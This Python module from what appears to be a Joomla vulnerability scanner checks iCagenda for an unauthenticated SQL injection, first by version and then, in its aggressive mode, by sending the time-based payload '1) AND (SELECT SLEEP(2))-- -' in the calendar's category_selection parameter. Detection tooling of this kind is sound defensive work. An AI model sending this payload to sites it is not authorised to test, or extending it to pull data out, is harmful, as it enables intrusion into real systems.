from __future__ import annotations

import json
import re
import time
from datetime import datetime, timezone
from typing import Any
from urllib.parse import quote

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-67365"
NAME = "iCagenda calendar module unauthenticated SQL injection"
COMPONENT = "iCagenda"
AFFECTED_RULE = "iCagenda 4.0.0 through 4.0.11; fixed in 4.0.12"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
CALENDAR_PATH = "/index.php?option=com_ajax&module=icagenda_calendar&method=calendar&format=raw&modid={modid}&year={year}&month={month}&params={params}"
SLEEP_THRESHOLD = 1.2


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    minimum = parse_version_safe("4.0.0")
    fixed = parse_version_safe("4.0.12")
    if parsed is None or minimum is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if minimum <= parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("icagenda", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="iCagenda was not detected through its public manifest or component route.", action="No action is required unless iCagenda is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected iCagenda {version}, within the affected 4.x range below 4.0.12."
        action = "Upgrade iCagenda to 4.0.12 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected iCagenda {version}, outside the affected 4.0.0-4.0.11 range."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "iCagenda was detected, but its version could not be determined."
        action = "Determine the installed iCagenda version and upgrade to 4.0.12 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _params(category_selection: str) -> str:
    payload = {
        "category_filter": "1",
        "category_selection": [category_selection],
    }
    return quote(json.dumps(payload, separators=(",", ":")), safe="")


def _timed_get(client: HttpClient, url: str, timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.get(url, timeout=timeout)
    return response, time.perf_counter() - start


def run_aggressive_probe(
    target_url: str,
    modid: int = 1,
    year: int | None = None,
    month: int | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Time-based proof of the calendar module's category_selection SQLi.

    The module's ``calendarAjax()`` reads the request ``params`` JSON, then
    ``getCalendar()`` concatenates ``category_selection`` into
    ``e.catid IN ( ... )``. ``1) AND (SELECT SLEEP(2))-- -`` delays the
    unauthenticated ``com_ajax`` request when at least one matching event is
    present. The probe is read-only (SELECT with SLEEP).
    """
    base = normalize_url(target_url)
    now = datetime.now(timezone.utc)
    year = year or now.year
    month = month or now.month
    client = HttpClient(timeout=timeout, proxy=proxy)
    benign_url = f"{base}{CALENDAR_PATH.format(modid=modid, year=year, month=month, params=_params('1'))}"
    probe_url = f"{base}{CALENDAR_PATH.format(modid=modid, year=year, month=month, params=_params('1) AND (SELECT SLEEP(2))-- -'))}"
    benign, benign_time = _timed_get(client, benign_url, timeout)
    if is_transport_error(benign):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=benign_url, detail=f"The benign calendar request failed in transit ({transport_error_detail(benign)}).", action="Retry when the target is reachable.")
    probe, probe_time = _timed_get(client, probe_url, timeout)
    if is_transport_error(probe):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=probe_url, detail=f"The calendar probe failed in transit ({transport_error_detail(probe)}).", action="Retry when the target is reachable.")

    delta = probe_time - benign_time
    evidence = {
        "modid": modid,
        "year": year,
        "month": month,
        "benign_status": benign.get("status"),
        "benign_seconds": round(benign_time, 3),
        "probe_status": probe.get("status"),
        "probe_seconds": round(probe_time, 3),
        "delta_seconds": round(delta, 3),
        "sleep_threshold": SLEEP_THRESHOLD,
    }
    if probe.get("status") == 200 and benign.get("status") == 200 and delta >= SLEEP_THRESHOLD:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=probe_url,
            evidence=evidence,
            detail=(
                "The unauthenticated com_ajax calendar request concatenated category_selection into the events "
                f"query: the probe added {delta:.2f}s over the benign baseline (threshold {SLEEP_THRESHOLD}s)."
            ),
            action="Upgrade iCagenda to 4.0.12 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=probe_url,
        evidence=evidence,
        detail=(
            f"The calendar endpoint returned HTTP {probe.get('status')} and added only {delta:.2f}s over the "
            "benign baseline; the category_selection value did not reach the query sink, or no event matched."
        ),
        action="Upgrade affected iCagenda versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    now = datetime.now(timezone.utc)
    url = f"{base}{CALENDAR_PATH.format(modid=1, year=now.year, month=now.month, params=_params('1'))}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The calendar endpoint could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    if response.get("status") == 200:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The calendar endpoint is reachable; the timing payload was not sent in safe mode.", action="Use aggressive mode with a month that has events on an authorized staging site.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The calendar endpoint returned HTTP {response.get('status')}; no proof was attempted.", action="Verify the module and com_ajax route on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because iCagenda was not detected as potentially affected."
            return passive
        modid_value = aggressive_value(aggressive_args, aggressive_command, "modid")
        year_value = aggressive_value(aggressive_args, aggressive_command, "year")
        month_value = aggressive_value(aggressive_args, aggressive_command, "month")
        result = run_aggressive_probe(
            target_url,
            modid=int(modid_value) if modid_value and modid_value.isdigit() else 1,
            year=int(year_value) if year_value and year_value.isdigit() else None,
            month=int(month_value) if month_value and month_value.isdigit() else None,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (calendar reachability) and aggressive (time-based SQLi) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["icagenda"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-67365", "https://www.icagenda.com", "https://mysites.guru/vulnerabilities/CVE-2026-67365"]}
